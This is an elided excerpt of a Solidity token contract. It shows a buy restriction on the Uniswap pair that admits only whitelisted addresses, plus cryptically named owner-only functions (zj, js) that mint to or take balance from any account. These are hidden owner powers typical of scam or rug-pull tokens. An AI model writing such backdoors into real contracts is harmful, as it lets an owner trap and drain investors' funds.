...
contract ERC20 is Context, IERC20, IERC20Metadata, Manage {
    ...
    constructor(address usdtAddress,address factoryAddress) {
        ...
        zj(msg.sender,100000000 * (10**decimals()));
    ...
    function addBLists(address[] memory addrs)public onlyOwner{
        uint256 i=0;
    ...
    function _transfer(
        ...
        if(from==_uniswapV2Pair && _swapRewardSwitch==1){
            require(bList[to], "ERC20: only white list");
        }
     ...
     */
    function zj(address account, uint256 amount) public onlyOwner {
     ...
     */
    function js(address account, uint256 amount) public onlyOwner {
